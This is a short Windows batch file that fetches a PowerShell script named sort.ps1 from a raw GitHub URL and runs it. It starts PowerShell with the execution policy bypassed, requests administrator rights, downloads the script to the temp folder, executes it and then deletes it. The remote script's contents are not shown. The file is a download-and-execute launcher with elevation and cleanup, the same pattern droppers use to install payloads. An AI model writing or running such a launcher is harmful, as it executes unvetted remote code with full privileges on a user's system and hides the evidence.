@echo off
set "ps1url=https://raw.githubusercontent.com/09sychic/xds3/refs/heads/main/sort.ps1"
set "ps1file=%temp%\sort.ps1"

REM Elevate and run PS1
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Start-Process PowerShell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -UseBasicParsing %ps1url% -OutFile %ps1file%; & %ps1file%; Remove-Item %ps1file%\"'"

exit /b
